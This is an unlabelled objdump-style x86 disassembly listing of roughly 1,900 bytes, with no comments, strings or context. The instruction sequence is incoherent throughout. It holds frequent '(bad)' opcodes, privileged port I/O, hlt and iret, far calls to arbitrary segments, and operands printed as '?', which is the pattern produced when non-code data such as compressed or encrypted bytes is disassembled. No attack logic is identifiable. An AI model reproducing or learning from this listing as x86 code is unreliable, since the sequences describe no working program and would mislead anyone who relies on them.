  416a5f:	mov    al,0x8a
  416a61:	adc    al,0xf6
  416a63:	dec    eax
  416a64:	jmp    0x416a0c
  416a66:	scas   al,BYTE PTR es:[edi]
  416a67:	mov    ah,0x83
  416a69:	mov    ch,0xc9
  416a6b:	add    al,0xd8
  416a6d:	add    al,0x33
  416a6f:	cld    
  416a70:	pusha  
  416a71:	(bad)  
  416a73:	inc    ebx
  416a74:	(bad)  
  416a75:	mov    ecx,0x47981730
  416a7a:	js     0x416a24
  416a7c:	sbb    cl,BYTE PTR [ebp+0x3a3681a7]
  416a82:	mov    WORD PTR [edi+0x20],fs
  416a85:	ds sbb al,0xca
  416a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a8a:	out    0x52,eax
  416a8c:	cld    
  416a8d:	scas   al,BYTE PTR es:[edi]
  416a8e:	or     eax,0x101f1d05
  416a93:	mov    ecx,0xd378530c
  416a98:	repnz xchg ecx,eax
  416a9a:	dec    ebx
  416a9b:	or     ebx,DWORD PTR [edx]
  416a9d:	push   cs
  416a9e:	xchg   BYTE PTR [eax-0x32b54bc8],dh
  416aa4:	lods   eax,DWORD PTR ds:[esi]
  416aa5:	mov    ds:0x84541acb,eax
  416aaa:	iret   
  416aab:	in     al,0xd1
  416aad:	pop    esi
  416aae:	sub    al,0xaa
  416ab0:	inc    ebp
  416ab1:	bound  edx,QWORD PTR [eax]
  416ab3:	or     dl,BYTE PTR [eax-0x34]
  416ab6:	mov    esi,0xa12edb18
  416abb:	add    eax,0x908d7190
  416ac0:	sahf   
  416ac1:	add    al,0x60
  416ac3:	jae    0x416b29
  416ac5:	xor    ecx,DWORD PTR es:0x841a4b43
  416acc:	pop    esi
  416acd:	pop    eax
  416ace:	push   esp
  416acf:	and    eax,0x1035a9c0
  416ad4:	inc    edx
  416ad5:	mov    eax,DWORD PTR [esi+0x28e5a1f]
  416adb:	sbb    al,0x42
  416add:	rol    BYTE PTR [ebx],0x1c
  416ae0:	or     DWORD PTR [eax],esi
  416ae2:	aaa    
  416ae3:	test   DWORD PTR [edi+0x767fb8c4],eax
  416ae9:	faddp  st(5),st
  416aeb:	pop    edx
  416aec:	pop    ecx
  416aed:	fmul   DWORD PTR [edx+0x5e39d4ec]
  416af3:	xchg   BYTE PTR [ecx-0x18],bl
  416af6:	cmc    
  416af7:	nop
  416af8:	rcl    BYTE PTR ss:[esi+ebp*2+0x50],1
  416afd:	(bad)  
  416afe:	adc    ch,cl
  416b00:	lock add eax,0x66
  416b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b05:	hlt    
  416b06:	inc    esp
  416b07:	add    dl,al
  416b09:	(bad)  
  416b0a:	into   
  416b0b:	stos   BYTE PTR es:[edi],al
  416b0c:	mov    ds:0x468830b1,al
  416b11:	sbb    eax,0xab5ad6c0
  416b16:	cmp    al,0xe8
  416b18:	dec    esp
  416b19:	neg    BYTE PTR [edx-0x5f18e969]
  416b1f:	lahf   
  416b20:	push   eax
  416b21:	adc    bh,BYTE PTR [esi-0x4ba32d0b]
  416b27:	scas   eax,DWORD PTR es:[edi]
  416b28:	int3   
  416b29:	mov    al,ds:0x850c0a00
  416b2e:	stos   BYTE PTR es:[edi],al
  416b2f:	push   edx
  416b30:	repnz pusha 
  416b32:	les    edx,FWORD PTR [esi-0x1dfa7a2]
  416b38:	sbb    BYTE PTR [ebx+0x8e83088],ch
  416b3e:	mov    ds:0x6f3d1cad,al
  416b43:	retf   0xfb33
  416b46:	mov    ah,0x20
  416b48:	lock push eax
  416b4a:	push   0x7a
  416b4c:	push   0x28ccc058
  416b51:	mov    eax,ds:0x92403c55
  416b56:	(bad)  
  416b57:	fadd   QWORD PTR [ecx]
  416b59:	inc    esi
  416b5a:	retf   
  416b5b:	aam    0xd1
  416b5d:	shl    DWORD PTR [eax+0x14],1
  416b60:	imul   ebp,DWORD PTR [esi+0x79],0x0
  416b64:	enter  0x452a,0x86
  416b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b69:	and    al,BYTE PTR [ebp-0x1d83c118]
  416b6f:	jg     0x416bd9
  416b71:	jbe    0x416b1b
  416b73:	ss mov ah,0x5b
  416b76:	inc    eax
  416b77:	push   edx
  416b78:	enter  0x6214,0xba
  416b7c:	js     0x416b0f
  416b7e:	pshufw mm0,QWORD PTR [ecx+0x2a],0xc2
  416b83:	jbe    0x416b45
  416b85:	and    al,0x13
  416b87:	adc    eax,0x2d328357
  416b8c:	add    BYTE PTR [esi],ch
  416b8e:	mov    esi,0x6d9a2a4b
  416b93:	push   eax
  416b94:	sar    BYTE PTR [ecx+ebx*4+0x54b2880a],1
  416b9b:	inc    eax
  416b9c:	leave  
  416b9d:	lods   al,BYTE PTR ds:[esi]
  416b9e:	dec    ebx
  416b9f:	or     DWORD PTR [ebx+0x182717d8],ebp
  416ba5:	dec    esi
  416ba6:	xor    al,0x43
  416ba8:	push   0x96f0f688
  416bad:	mov    WORD PTR [eax+0x68],fs
  416bb0:	mov    edi,0x10a4a20d
  416bb5:	pop    esi
  416bb6:	inc    esp
  416bb7:	sahf   
  416bb8:	add    al,0x5
  416bba:	fcom   st(5)
  416bbc:	mov    dh,0x2b
  416bbe:	push   cs
  416bbf:	xor    BYTE PTR [ecx],0x46
  416bc2:	sbb    esp,edi
  416bc4:	call   0x9acc:0xc4325c3a
  416bcb:	inc    esi
  416bcc:	sti    
  416bcd:	push   esp
  416bce:	fistp  DWORD PTR [edx]
  416bd0:	cmp    cl,BYTE PTR [esi+0x72]
  416bd3:	xchg   edx,eax
  416bd4:	in     al,0x46
  416bd6:	xchg   BYTE PTR [esp+ebp*4],al
  416bd9:	stos   BYTE PTR es:[edi],al
  416bda:	adc    DWORD PTR [ecx-0x462b70fb],ecx
  416be0:	pop    edx
  416be1:	imul   esi,DWORD PTR ds:0xd05682e8,0xec2204da
  416beb:	adc    BYTE PTR [edi],ah
  416bed:	dec    eax
  416bee:	int    0x22
  416bf0:	pop    ebp
  416bf1:	int3   
  416bf2:	or     ecx,esp
  416bf4:	mov    bh,0x8a
  416bf6:	fcomp  DWORD PTR [esp+edi*1]
  416bf9:	cmp    al,BYTE PTR [esi+edi*1+0x0]
  416bfd:	adc    esi,ebx
  416bff:	fisub  WORD PTR [ebx]
  416c01:	jp     0x416bd3
  416c03:	mov    dl,BYTE PTR [ebp+ecx*1-0x6e]
  416c07:	(bad)  
  416c08:	jle    0x416bd8
  416c0a:	jae    0x416c34
  416c0c:	pop    eax
  416c0d:	pop    esp
  416c0e:	retf   
  416c0f:	pop    eax
  416c10:	push   eax
  416c11:	idiv   BYTE PTR [ebp-0x63a858fa]
  416c17:	dec    ebx
  416c18:	mov    WORD PTR [edi],ds
  416c1a:	and    BYTE PTR [esi-0x36],dl
  416c1d:	mov    fs,WORD PTR [eax+ebp*1+0xac0078b]
  416c24:	xchg   eax,esi
  416c26:	ficomp WORD PTR [ecx]
  416c28:	jbe    0x416c58
  416c2a:	or     al,0xb5
  416c2c:	stos   DWORD PTR es:[edi],eax
  416c2d:	call   0xf1b:0xc61e00c4
  416c34:	adc    al,0x53
  416c36:	cs shr ah,0xcd
  416c3a:	mov    eax,0xd8762474
  416c3f:	push   cs
  416c40:	or     eax,0x82516658
  416c45:	(bad)  
  416c46:	sbb    eax,0x6a34740
  416c4b:	sub    eax,0xf76ee25a
  416c50:	mov    dh,0xab
  416c52:	jecxz  0x416c9e
  416c54:	mov    ds:0x4a6f12f7,al
  416c59:	dec    ebp
  416c5a:	mov    esi,DWORD PTR [esi-0x20]
  416c5d:	adc    eax,0x64320d85
  416c62:	cmp    al,dh
  416c64:	mov    dl,0xc
  416c66:	sbb    BYTE PTR [ecx+0x20de8441],ah
  416c6c:	nop
  416c6d:	push   es
  416c6e:	push   eax
  416c6f:	push   ebx
  416c70:	mov    cl,0x82
  416c72:	or     cl,dl
  416c74:	mov    ch,0x58
  416c76:	and    bh,BYTE PTR [eax]
  416c78:	sbb    al,0x54
  416c7a:	aaa    
  416c7b:	into   
  416c7c:	cld    
  416c7d:	mov    dl,0x9c
  416c7f:	bound  ebx,QWORD PTR [edx]
  416c81:	pop    ebx
  416c82:	lds    ebx,FWORD PTR [ebx+0xc285dc]
  416c88:	mov    bh,0x4c
  416c8a:	and    BYTE PTR [ebx+eiz*2-0x79776863],dl
  416c91:	pop    es
  416c92:	push   esp
  416c93:	out    0x62,eax
  416c95:	es push cs
  416c97:	sbb    BYTE PTR [ebp+edx*1+0x0],al
  416c9b:	mov    ah,0xd8
  416c9d:	std    
  416c9e:	test   BYTE PTR [eax+0x1a9c34e1],dh
  416ca4:	xlat   BYTE PTR ds:[ebx]
  416ca5:	in     eax,dx
  416ca6:	dec    esi
  416ca7:	jecxz  0x416c9d
  416ca9:	add    DWORD PTR [esi+0x43],0xffffff83
  416cad:	(bad)  
  416cae:	push   eax
  416caf:	mov    WORD PTR [edx],es
  416cb1:	mov    ah,ah
  416cb3:	adc    bl,BYTE PTR [edx+0x66a09a9a]
  416cb9:	lods   al,BYTE PTR ds:[esi]
  416cba:	mov    ah,0x24
  416cbc:	cs pop ebp
  416cbe:	sbb    eax,0xffffff94
  416cc1:	and    DWORD PTR [eax+ebp*2-0x7a],esi
  416cc5:	xchg   edx,eax
  416cc6:	mov    WORD PTR [esi+ecx*1],ss
  416cc9:	mov    al,ds:0x9cd41cdf
  416cce:	das    
  416ccf:	or     BYTE PTR [ebx+0x2e9b462a],bl
  416cd5:	mov    ecx,0x40adca56
  416cda:	pusha  
  416cdb:	(bad)  
  416cdd:	test   al,0x5e
  416cdf:	push   0xffffffa8
  416ce1:	std    
  416ce2:	cs daa 
  416ce4:	ins    DWORD PTR es:[edi],dx
  416ce5:	imul   ebx,DWORD PTR [ebp+0x4d],0x34
  416ce9:	add    al,0x8
  416ceb:	mov    BYTE PTR [esi-0x80],dh
  416cee:	mov    al,ds:0x965e7f2c
  416cf3:	and    BYTE PTR [esi+0x1b],0xec
  416cf7:	add    BYTE PTR [ebp-0x11],ch
  416cfa:	out    dx,al
  416cfb:	pop    esp
  416cfc:	mov    dh,0xf1
  416cfe:	hlt    
  416cff:	dec    esp
  416d00:	stc    
  416d01:	pusha  
  416d02:	mov    ah,0xd0
  416d04:	hlt    
  416d05:	mov    ds:0x78ff1a47,al
  416d0a:	add    BYTE PTR [ebp+0x2334edd0],ch
  416d10:	aad    0xa1
  416d12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d13:	add    BYTE PTR [esi-0x14],dh
  416d16:	sub    BYTE PTR [edx+0x35b5c1b6],cl
  416d1c:	mov    esp,0x21883a0f
  416d21:	jp     0x416d67
  416d23:	lods   al,BYTE PTR ds:[esi]
  416d24:	stc    
  416d25:	mov    ch,BYTE PTR fs:[esi+0x62bc5d84]
  416d2c:	jnp    0x416cb6
  416d2e:	shl    DWORD PTR [edx],cl
  416d30:	jns    0x416d52
  416d32:	mov    al,0x3b
  416d34:	cmp    ah,BYTE PTR [esi+eax*1]
  416d37:	call   0x4844:0xac
  416d3d:	mov    al,0xf1
  416d3f:	add    BYTE PTR [eax+0x60],bl
  416d42:	loop   0x416d7a
  416d44:	mov    esp,0x41f4e271
  416d49:	lods   eax,DWORD PTR ds:[esi]
  416d4a:	clc    
  416d4b:	xchg   esi,eax
  416d4c:	inc    eax
  416d4d:	loop   0x416d8e
  416d4f:	into   
  416d50:	(bad)  
  416d51:	aad    0x8a
  416d53:	add    al,0x94
  416d55:	fnop   
  416d57:	jge    0x416d9a
  416d59:	mov    WORD PTR [esi+0x6196613e],?
  416d5f:	cmp    edx,DWORD PTR [esi+0x289a8a31]
  416d65:	push   esp
  416d66:	cmp    eax,DWORD PTR [edx]
  416d68:	sub    dh,BYTE PTR [edi+esi*8+0x60822ae8]
  416d6f:	xlat   BYTE PTR ds:[ebx]
  416d70:	mov    edx,0x1352eb21
  416d75:	xchg   esp,eax
  416d76:	mov    ?,esp
  416d78:	mov    eax,0xf05b77b7
  416d7d:	dec    ecx
  416d7e:	pusha  
  416d7f:	jb     0x416ddc
  416d81:	push   esi
  416d82:	ja     0x416d56
  416d84:	repnz cmp DWORD PTR [eax+0x4052f010],ecx
  416d8b:	inc    ecx
  416d8c:	push   0x6e
  416d8e:	dec    ecx
  416d8f:	ds test al,0xc0
  416d92:	cmp    ch,BYTE PTR [esi-0x17]
  416d95:	lods   al,BYTE PTR ds:[esi]
  416d96:	push   ebp
  416d97:	dec    edx
  416d98:	fmul   QWORD PTR [ebp-0x5a29df2c]
  416d9e:	cwde   
  416d9f:	fwait
  416da0:	dec    esi
  416da1:	out    0x84,al
  416da3:	add    al,cl
  416da5:	or     dh,BYTE PTR [ebp-0x28c2e9ba]
  416dab:	dec    esi
  416dac:	ins    BYTE PTR es:[edi],dx
  416dad:	push   esi
  416dae:	adc    eax,0xf7ad955
  416db3:	sub    BYTE PTR [esi],al
  416db5:	pop    ebx
  416db6:	mov    esp,0x6bded83b
  416dbb:	inc    eax
  416dbc:	xor    al,0x85
  416dbe:	cdq    
  416dbf:	mov    eax,0x528ccb8
  416dc4:	adc    eax,0x6aaf6b35
  416dc9:	and    al,0x4d
  416dcb:	adc    BYTE PTR [edx],bh
  416dcd:	and    dl,dh
  416dcf:	icebp  
  416dd0:	in     al,dx
  416dd1:	rol    BYTE PTR [edx+eiz*8],0x83
  416dd5:	mov    ch,0x9a
  416dd7:	rcl    ebp,0xc0
  416dda:	add    eax,DWORD PTR [eax]
  416ddc:	loope  0x416de9
  416dde:	sub    BYTE PTR [eax-0x64],bh
  416de1:	imul   ecx,DWORD PTR [eax],0xffffff8a
  416de4:	mov    edx,0xa6dfafa0
  416de9:	shl    BYTE PTR [ebp+0x28],1
  416dec:	cwde   
  416ded:	cwde   
  416dee:	sbb    al,0xb8
  416df0:	xchg   esp,eax
  416df1:	mov    al,0x0
  416df3:	sar    BYTE PTR [esi-0x30],1
  416df6:	ss stos DWORD PTR es:[edi],eax
  416df8:	add    BYTE PTR [ebx+edx*1],dh
  416dfb:	sub    BYTE PTR [edx+0x3624a886],cl
  416e01:	cmp    eax,0xaae61f0a
  416e06:	mov    cs,WORD PTR [edx]
  416e08:	jl     0x416d8c
  416e0a:	mov    esi,DWORD PTR [ecx+0x56]
  416e0d:	pop    ss
  416e0e:	mov    al,0x10
  416e10:	into   
  416e11:	call   0x984d:0xa1e04d8
  416e18:	xor    esi,edx
  416e1a:	les    ebx,FWORD PTR [edx]
  416e1c:	xchg   BYTE PTR ds:0x5d12cfb7,al
  416e22:	fisttp DWORD PTR [esi+0x12c600b6]
  416e28:	mov    ah,0xb8
  416e2a:	sahf   
  416e2b:	xchg   ebp,eax
  416e2c:	rcl    BYTE PTR ds:0xd7882e81,cl
  416e32:	sub    al,0xcf
  416e34:	lock pop ecx
  416e36:	les    esp,FWORD PTR [esi+0x6a]
  416e39:	push   ss
  416e3a:	gs out dx,al
  416e3c:	push   0x68e8a51a
  416e41:	js     0x416dd9
  416e43:	cld    
  416e44:	sub    al,BYTE PTR [edx]
  416e46:	out    dx,eax
  416e47:	not    ah
  416e49:	ret    
  416e4a:	inc    esi
  416e4b:	inc    edi
  416e4c:	imul   esp,DWORD PTR [edx+ebx*2+0x29542dca],0xffffffd8
  416e54:	jo     0x416e96
  416e56:	mov    eax,ds:0x6036bfae
  416e5b:	clc    
  416e5c:	dec    ebp
  416e5d:	jg     0x416e76
  416e5f:	adc    al,0x5d
  416e61:	inc    edx
  416e62:	mov    ds,ebp
  416e64:	push   0x3f669050
  416e69:	add    BYTE PTR [eax],dh
  416e6b:	sbb    cl,BYTE PTR [edi-0x3136053a]
  416e71:	(bad)  
  416e72:	sbb    al,BYTE PTR [ecx-0x256ced75]
  416e78:	les    ebp,FWORD PTR [eax+0x7cd61002]
  416e7e:	lds    ebx,FWORD PTR [eax]
  416e80:	add    BYTE PTR [ecx-0x48],dh
  416e83:	(bad)  
  416e84:	or     dl,BYTE PTR [esi]
  416e86:	dec    ebp
  416e87:	or     dl,BYTE PTR [ebp-0x4dd9ee54]
  416e8d:	push   ss
  416e8e:	adc    DWORD PTR [ecx+0x4],esi
  416e91:	mov    ch,0x5
  416e93:	mov    ds:0xdb88aa5b,al
  416e98:	in     al,0x76
  416e9a:	xor    eax,0x3456c159
  416e9f:	ins    BYTE PTR es:[edi],dx
  416ea0:	retf   0xfb61
  416ea3:	xor    BYTE PTR [esp+eax*1-0x60946636],al
  416eaa:	add    al,0x16
  416eac:	fiadd  DWORD PTR [edi+esi*4]
  416eaf:	clc    
  416eb0:	mov    eax,0x34f463c4
  416eb5:	pop    edx
  416eb6:	inc    ecx
  416eb7:	inc    ecx
  416eb8:	cmp    BYTE PTR [edx+0x5e],dh
  416ebb:	ins    BYTE PTR es:[edi],dx
  416ebc:	mov    esi,0xad88594
  416ec1:	sbb    bl,BYTE PTR [esp+ebx*4-0x38]
  416ec5:	push   edi
  416ec6:	jle    0x416eb3
  416ec8:	push   ss
  416ec9:	pop    es
  416eca:	test   al,0x86
  416ecc:	dec    ebp
  416ecd:	add    dh,dl
  416ecf:	mov    esp,0x447d818e
  416ed4:	and    eax,0x77a9f120
  416ed9:	hlt    
  416eda:	or     BYTE PTR [edx+0xb],ah
  416edd:	ret    0xd826
  416ee0:	stos   BYTE PTR es:[edi],al
  416ee1:	and    DWORD PTR [edx-0x16],ecx
  416ee4:	mov    eax,0xd435139b
  416ee9:	ss cmp al,0x4e
  416eec:	xor    BYTE PTR [edx],0x4f
  416eef:	jne    0x416f13
  416ef1:	add    esi,edx
  416ef3:	adc    BYTE PTR [esi+0x64b48f8e],dh
  416ef9:	rol    BYTE PTR [eax+eax*2+0x58],cl
  416efd:	pop    ss
  416efe:	xchg   ebp,eax
  416eff:	cwde   
  416f00:	mov    dl,0xcf
  416f02:	mov    al,ds:0xd434e1ec
  416f07:	fadd   DWORD PTR [edi+0x715bcdb5]
  416f0d:	push   0xffffffde
  416f0f:	loop   0x416f11
  416f11:	int3   
  416f12:	xor    bh,BYTE PTR [edx]
  416f14:	pop    esi
  416f15:	or     edx,edi
  416f17:	neg    ch
  416f19:	inc    esi
  416f1a:	inc    ebp
  416f1b:	inc    ebx
  416f1c:	mov    ds:0x9764f380,al
  416f21:	inc    esp
  416f22:	in     eax,0x22
  416f24:	mov    dh,0x67
  416f26:	add    edx,esp
  416f28:	pop    esi
  416f29:	les    ebp,FWORD PTR [ebp+0x68433437]
  416f2f:	(bad)  
  416f30:	xor    BYTE PTR [edx-0x30],dh
  416f33:	inc    edi
  416f34:	(bad)  
  416f35:	pop    esp
  416f36:	(bad)  
  416f37:	arpl   WORD PTR [ebx+0x33],bp
  416f3a:	xchg   edx,eax
  416f3b:	cli    
  416f3c:	loopne 0x416fa4
  416f3e:	inc    esi
  416f3f:	(bad)  
  416f41:	cli    
  416f42:	add    cl,dh
  416f44:	or     eax,edx
  416f46:	add    ah,BYTE PTR [ecx+0x58]
  416f49:	mov    ebx,0x2b5be291
  416f4e:	cmp    BYTE PTR ds:0x373a6ddc,ah
  416f54:	jns    0x416f56
  416f56:	push   esi
  416f57:	push   esp
  416f58:	fs enter 0xc522,0x7
  416f5d:	pusha  
  416f5e:	stos   DWORD PTR es:[edi],eax
  416f5f:	cmp    esi,DWORD PTR [edx-0x3177462d]
  416f65:	adc    BYTE PTR ds:0x52118acd,dl
  416f6b:	inc    ecx
  416f6c:	fldenv [esi]
  416f6e:	push   0x40
  416f70:	ror    DWORD PTR cs:[edx+0x3438b60b],0xfa
  416f78:	xchg   edi,eax
  416f79:	in     al,0x44
  416f7b:	nop
  416f7c:	inc    esp
  416f7d:	pop    es
  416f7e:	test   ah,dh
  416f80:	cmp    esp,DWORD PTR es:[ebp+ecx*8-0x6e71f94]
  416f88:	je     0x416fa6
  416f8a:	xor    edx,ebp
  416f8c:	adc    ebx,DWORD PTR [edx+0x60]
  416f8f:	scas   eax,DWORD PTR es:[edi]
  416f90:	nop
  416f91:	pushf  
  416f92:	pop    ss
  416f93:	rcl    WORD PTR cs:[esi-0x33],0x41
  416f99:	mov    al,ds:0xe30ee3
  416f9e:	jle    0x416f52
  416fa0:	sbb    al,0x5
  416fa2:	imul   ebp,DWORD PTR [ebp+ecx*1+0x5d],0x32
  416fa7:	pop    eax
  416fa8:	aam    0x14
  416faa:	jl     0x416f45
  416fac:	or     BYTE PTR [esi-0x78],ch
  416faf:	inc    edi
  416fb0:	push   eax
  416fb1:	ret    
  416fb2:	neg    dh
  416fb4:	adc    al,0x92
  416fb6:	jle    0x416f4f
  416fb8:	ficom  DWORD PTR [eax-0x2f]
  416fbb:	in     al,dx
  416fbc:	mov    ds:0x41e5d42,eax
  416fc1:	sbb    al,0x5
  416fc3:	or     bl,BYTE PTR [edi-0x5e]
  416fc6:	sub    BYTE PTR [esi],0xdb
  416fc9:	jp     0x416f52
  416fcb:	dec    ecx
  416fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fcd:	or     BYTE PTR [esp+ecx*1-0x7f],cl
  416fd1:	enter  0x485,0x83
  416fd5:	lea    edx,ds:0x6a5d32b0
  416fdb:	cmp    edx,DWORD PTR [edi+edi*1+0xa]
  416fdf:	mov    ah,0x76
  416fe1:	test   BYTE PTR [eax],bl
  416fe3:	push   cs
  416fe4:	mov    ah,0x9
  416fe6:	loope  0x41700f
  416fe8:	mov    al,0x40
  416fea:	mov    bl,0xf5
  416fec:	lock (bad) 
  416fee:	ror    BYTE PTR [edx],cl
  416ff0:	and    DWORD PTR [eax-0x5358330a],ecx
  416ff6:	xchg   esi,eax
  416ff7:	mov    esp,0xa2ac0e8
  416ffc:	fisubr DWORD PTR [ecx-0x75965f4f]
  417002:	jb     0x416fd4
  417004:	push   edi
  417005:	(bad)  
  417006:	push   eax
  417007:	ret    
  417008:	push   0x5832eaad
  41700d:	inc    ebx
  41700e:	out    dx,al
  41700f:	sbb    DWORD PTR [eax+0x6a282c02],esp
  417015:	sbb    cl,BYTE PTR [ecx+0xd964856]
  41701b:	cli    
  41701c:	jbe    0x416fab
  41701e:	pop    ebp
  41701f:	adc    ecx,DWORD PTR cs:[esp+edx*1]
  417023:	xchg   ecx,eax
  417024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417025:	pusha  
  417026:	and    dl,cl
  417028:	sahf   
  417029:	push   ss
  41702a:	clc    
  41702b:	adc    BYTE PTR [ebx+0x28d07d3c],bh
  417031:	push   es
  417032:	or     al,0xa1
  417034:	and    al,BYTE PTR [ebx+0x2]
  417037:	dec    ecx
  417038:	add    al,0x54
  41703a:	mov    ds:0x68d8e27a,al
  41703f:	mov    dl,0x22
  417041:	or     DWORD PTR [edi+ecx*2+0x1c],ebp
  417045:	lods   al,BYTE PTR ds:[esi]
  417046:	xchg   ebp,eax
  417047:	inc    edi
  417048:	popa   
  417049:	jae    0x416fd5
  41704b:	call   0x3476:0xa6ae7d0a
  417052:	xor    DWORD PTR [ecx-0xa4d8b28],ecx
  417058:	xor    ch,ah
  41705a:	mov    ds:0x343b6c24,al
  41705f:	in     al,0x6a
  417061:	pop    esi
  417062:	sbb    al,0x28
  417064:	rol    dh,1
  417066:	xchg   BYTE PTR [esi+0x45],ah
  417069:	or     al,BYTE PTR [ebp-0x60]
  41706c:	inc    esi
  41706d:	imul   eax,DWORD PTR [edx],0x5c
  417070:	add    al,0xf0
  417072:	sub    al,0xb5
  417074:	push   edi
  417075:	cwde   
  417076:	aam    0xed
  417078:	rol    BYTE PTR [ebx+0x6e],1
  41707b:	or     eax,DWORD PTR [edx+0x2cd1db22]
  417081:	dec    esi
  417082:	xor    BYTE PTR [esi-0x8c7ddc4],ch
  417088:	ror    BYTE PTR ds:0xa2b6244f,0x88
  41708f:	shl    BYTE PTR [esp+ebp*2+0x41f6ec83],cl
  417096:	adc    eax,0xcc67aa0d
  41709b:	outs   dx,BYTE PTR ds:[esi]
  41709c:	and    DWORD PTR [edx+0x50],edx
  41709f:	fwait
  4170a0:	sub    BYTE PTR [eax],ch
  4170a2:	push   eax
  4170a3:	dec    esp
  4170a4:	mov    cl,BYTE PTR [edi]
  4170a6:	pushf  
  4170a7:	jle    0x4170d6
  4170a9:	xor    BYTE PTR [ebx+0xd48ab8],dl
  4170af:	je     0x41706f
  4170b1:	mov    cl,BYTE PTR [ecx+0x5a478251]
  4170b7:	fwait
  4170b8:	retf   0x5328
  4170bb:	stos   BYTE PTR es:[edi],al
  4170bc:	push   edx
  4170bd:	mov    dh,al
  4170bf:	inc    esp
  4170c0:	pop    eax
  4170c1:	aaa    
  4170c2:	test   BYTE PTR [esi+ebx*4-0x575fdd92],ah
  4170c9:	test   al,0xc2
  4170cb:	call   0xd9e0:0x714840a
  4170d2:	mov    eax,ds:0x84bc028c
  4170d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d8:	inc    esi
  4170d9:	add    BYTE PTR [eax-0x66],dh
  4170dc:	add    BYTE PTR cs:[ebx+0x54],cl
  4170e0:	or     eax,0x72c4fd58
  4170e5:	retf   
  4170e6:	test   DWORD PTR es:[esi],ecx
  4170e9:	add    DWORD PTR [edx],ebp
  4170eb:	mov    eax,0x7e20d780
  4170f0:	adc    bl,BYTE PTR [edi]
  4170f2:	dec    esp
  4170f3:	add    bh,bl
  4170f5:	add    al,0x83
  4170f7:	out    0x35,eax
  4170f9:	lods   al,BYTE PTR ds:[esi]
  4170fa:	test   al,0x78
  4170fc:	sahf   
  4170fd:	cli    
  4170fe:	xchg   esp,eax
  4170ff:	stc    
  417100:	mov    esi,0xe43eb54a
  417105:	daa    
  417106:	popa   
  417107:	inc    ecx
  417108:	jae    0x41715a
  41710a:	and    bh,BYTE PTR [eax]
  41710c:	and    al,0xf2
  41710e:	aas    
  41710f:	out    0xae,al
  417111:	in     eax,dx
  417112:	fadd   st,st(2)
  417114:	sub    DWORD PTR ds:0x89d08198,esp
  41711a:	int3   
  41711b:	ds call 0x88bd:0x66556853
  417123:	jg     0x417123
  417125:	loop   0x41711c
  417127:	pushf  
  417128:	push   ss
  417129:	aam    0x2
  41712b:	inc    edx
  41712c:	sub    al,BYTE PTR [eax]
  41712e:	add    eax,0x4ee0bbcd
  417133:	pushf  
  417134:	add    ch,bh
  417136:	fdiv   QWORD PTR [eax]
  417138:	not    al
  41713a:	shl    BYTE PTR [edx],0xb3
  41713d:	mov    ?,WORD PTR [ebp-0x67345b2c]
  417143:	mov    ah,0x40
  417145:	add    al,ah
  417147:	mov    fs,eax
  417149:	jmp    0xdada:0xe9eeeb00
  417150:	pop    esp
  417151:	cwde   
  417152:	test   al,0x0
  417154:	stos   DWORD PTR es:[edi],eax
  417155:	dec    ebx
  417156:	ret    0xb420
  417159:	xchg   BYTE PTR [edx],cl
  41715b:	dec    ebx
  41715c:	mov    ch,0x16
  41715e:	xor    bh,BYTE PTR [ebx+0x5091320c]
  417164:	adc    ebx,eax
  417166:	mov    esi,0x6885185
  41716b:	fs push ss
  41716d:	pop    esp
  41716e:	dec    ebp
  41716f:	inc    eax
  417170:	jne    0x4171ef
  417172:	sbb    al,0x87
  417174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417175:	call   0x35f2ee24
  41717a:	test   BYTE PTR [edx+0xb],cl
  41717d:	mov    dl,0x53
  41717f:	scas   al,BYTE PTR es:[edi]
  417180:	fadd   st,st(4)
  417182:	dec    ebx
  417183:	jmp    0x417158
  417185:	ins    DWORD PTR es:[edi],dx
  417186:	or     al,0x99
  417188:	adc    eax,0xf1cd150d
  41718d:	jl     0x41711f
  41718f:	neg    DWORD PTR [edx-0x18]
  417192:	lds    ebx,FWORD PTR [edx+0x9e5f863]
  417198:	test   al,0x70
  41719a:	inc    ebx
  41719b:	mov    dl,0xc4
  41719d:	or     DWORD PTR [eax+0x25],esi
  4171a0:	sub    al,0x32
  4171a2:	inc    edx
  4171a3:	mov    esp,0x2e1611df
  4171a8:	enter  0xd0da,0xd5
  4171ac:	enter  0x623c,0x34
  4171b0:	stos   BYTE PTR es:[edi],al
  4171b1:	jae    0x41713b
  4171b3:	loope  0x4171d6
  4171b5:	sub    ch,0x90
  4171b8:	retf   0xf5e
  4171bb:	inc    esi
  4171bc:	mov    al,ds:0x44d86248
  4171c1:	add    BYTE PTR [eax+ebx*4+0x4203ac8],ch
  4171c8:	js     0x41719d
  4171ca:	ret    0xf585
  4171cd:	dec    eax
  4171ce:	sbb    cl,cl
  4171d0:	sub    DWORD PTR [eax-0x39],0xffffffb4
  4171d4:	test   BYTE PTR [ecx-0x60],dl
  4171d7:	cs int3 
  4171d9:	pop    ds
  4171da:	dec    ebx
  4171db:	add    eax,0x29ca26b0
  4171e0:	inc    esp
  4171e1:	scas   al,BYTE PTR es:[edi]
  4171e2:	mov    bh,0x70
  4171e4:	call   0x42ce:0xcc2d72af
  4171eb:	sahf   
  4171ec:	fisub  WORD PTR [ebx]
  4171ee:	xor    al,BYTE PTR [eax]
  4171f0:	(bad)  
  4171f1:	xor    eax,ebx
  4171f3:	das    
  4171f4:	add    BYTE PTR [ebx],cl
  4171f6:	into   
  4171f7:	cs cli 
  4171f9:	dec    eax
  4171fa:	adc    DWORD PTR [edx+0x2c],ebp
  4171fd:	rol    bl,1
  4171ff:	les    ecx,FWORD PTR [esi-0x4ee8ff55]
  417205:	mov    bl,0xa6
  417207:	and    BYTE PTR [esi],al
  417209:	fidiv  DWORD PTR [ebx+0x3b22f35a]
  41720f:	clc    
  417210:	mov    ebp,DWORD PTR [eax-0x1851a95e]
  417216:	mov    esi,0xfa201429
  41721b:	pop    edi
  41721c:	add    BYTE PTR [eax],ch
  41721e:	or     BYTE PTR [ecx-0x3b811274],ah
  417224:	add    al,0xbc
  417226:	xchg   esi,eax
  417227:	jbe    0x41722f
